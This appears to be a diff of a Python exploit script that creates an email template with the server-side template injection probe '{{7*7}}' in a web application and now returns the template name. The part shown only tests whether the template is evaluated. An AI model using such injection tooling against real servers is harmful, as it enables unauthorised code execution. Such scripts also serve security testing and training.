@@ -110,7 +110,7 @@ def create_email_template(session, url, proxies=None):
     template_name = "ssti_t23"
     ssti = "{{7*7}}"
     data = {
-        "doc": "{\"docstatus\":0,\"doctype\":\"Email Template\",\"name\":\"New Email Template 1\",\"__islocal\":1,\"__unsaved\":1,\"owner\":\"zeljka.k@randomdomain.com\",\"__newname\":\"%s\",\"subject\":\"ssti_t6\",\"response\":\"<div>%s</div>\"}" % (template_name,ssti),
+        "doc": "{\"docstatus\":0,\"doctype\":\"Email Template\",\"name\":\"New Email Template 1\",\"__islocal\":1,\"__unsaved\":1,\"owner\":\"zeljka.k@randomdomain.com\",\"__newname\":\"%s\",\"subject\":\"%s\",\"response\":\"<div>%s</div>\"}" % (template_name,template_name,ssti),
         "action": "Save"
         }
     res = None
@@ -120,7 +120,7 @@ def create_email_template(session, url, proxies=None):
         res = session.post(url, data=data)
     print(res.content)
     if res.status_code == 200:
-        return True
+        return template_name
     else:
         print(F"Error in create_email_template: {res.status_code}, {res.content}")
         exit(1)
